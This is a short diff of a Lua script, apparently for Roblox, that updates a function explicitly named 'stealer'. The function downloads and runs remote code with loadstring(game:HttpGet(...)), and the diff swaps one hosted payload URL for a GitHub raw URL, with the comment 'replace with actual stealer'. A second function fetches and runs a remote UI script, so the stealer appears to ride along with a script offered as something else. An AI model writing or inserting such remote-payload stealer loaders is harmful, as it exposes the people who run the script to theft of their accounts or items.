@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet("https://pastefy.app/J7wMnojc/raw"))() -- replace with actual stealer
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/panumas1311/mekkubb/refs/heads/main/mekee"))() -- replace with actual stealer
 end
 local function loadui()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/ThundarZ/Welcome/refs/heads/main/Main/GaG/Main.lua'))()
